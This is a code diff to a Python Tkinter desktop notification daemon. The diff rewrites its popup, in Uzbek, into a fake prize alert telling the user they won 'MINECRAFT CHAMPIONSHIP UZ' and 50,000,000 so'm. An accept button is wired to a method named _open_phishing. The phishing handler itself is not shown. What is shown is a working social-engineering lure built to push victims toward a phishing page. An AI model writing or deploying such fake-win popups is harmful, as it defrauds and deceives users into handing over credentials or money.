@@ -15,7 +15,7 @@ import sys
 API = 'http://localhost:8001'
 BG    = '#1c1c1c'
 GREEN = '#00c853'
-W, H  = 350, 118
+W, H  = 380, 148
 
 
 class NotifDaemon(tk.Tk):
@@ -71,7 +71,7 @@ class NotifDaemon(tk.Tk):
                                                          fill=GREEN, outline='')
         self._dot_canvas.pack(side='left', padx=(0, 6))
 
-        tk.Label(top, text='MINECRAFT SERVER EVENTS',
+        tk.Label(top, text='MINECRAFT CHAMPIONSHIP UZ 🇺🇿',
                  font=('Courier New', 7), fg='#505050', bg=BG).pack(side='left')
 
         self._time_lbl = tk.Label(top, text='',
@@ -80,35 +80,37 @@ class NotifDaemon(tk.Tk):
 
         # Sarlavha
         tk.Label(body,
-                 text="🏆  Tabriklaymiz, o'yinchi!",
+                 text="🏆  TABRIKLAYMIZ!",
                  font=('Segoe UI', 11, 'bold'),
-                 fg='#ffffff', bg=BG, anchor='w').pack(anchor='w', pady=(5, 0))
+                 fg='#ffd700', bg=BG, anchor='w').pack(anchor='w', pady=(5, 0))
 
         # Matn
         tk.Label(body,
-                 text="Siz pul mukofotiga ega bo'ldingiz.\n"
-                      "Mukofotingizni darhol qo'lga kiriting!",
-                 font=('Segoe UI', 9),
-                 fg='#999999', bg=BG, anchor='w', justify='left').pack(anchor='w', pady=(3, 0))
+                 text="Siz \"MINECRAFT CHAMPIONSHIP UZ\"\n"
+                      "musobaqasining G'OLIBI bo'ldingiz!\n"
+                      "Yutuq: 50 000 000 so'm\n"
+                      "Mukofotni olish uchun — bu yerga bosing.",
+                 font=('Segoe UI', 8),
+                 fg='#aaaaaa', bg=BG, anchor='w', justify='left').pack(anchor='w', pady=(3, 0))
 
         # Tugmalar
         btn_row = tk.Frame(body, bg=BG)
         btn_row.pack(anchor='w', pady=(9, 0))
 
         tk.Button(btn_row,
-                  text="Ko'rish",
-                  font=('Segoe UI', 8, 'bold'),
-                  bg=GREEN, fg='#000000',
-                  activebackground='#69f0ae', activeforeground='#000',
-                  relief='flat', padx=13, pady=4, cursor='hand2',
+                  text='✅ Qabul qilish',
+                  font=('Courier New', 8, 'bold'),
+                  bg='#2e7d32', fg='#ffffff',
+                  activebackground='#4caf50', activeforeground='#fff',
+                  relief='raised', bd=2, padx=12, pady=3, cursor='hand2',
                   command=self._open_phishing).pack(side='left', padx=(0, 8))
 
         tk.Button(btn_row,
-                  text='Keyinroq',
-                  font=('Segoe UI', 8),
-                  bg='#2a2a2a', fg='#777777',
-                  activebackground='#333', activeforeground='#aaa',
-                  relief='flat', padx=10, pady=4, cursor='hand2',
+                  text="O'tkazib yuborish",
+                  font=('Courier New', 8),
+                  bg='#333333', fg='#aaaaaa',
+                  activebackground='#444', activeforeground='#ccc',
+                  relief='raised', bd=2, padx=8, pady=3, cursor='hand2',
                   command=self._dismiss).pack(side='left')
 
     # ── Animations ───────────────────────────────────────────────────────────
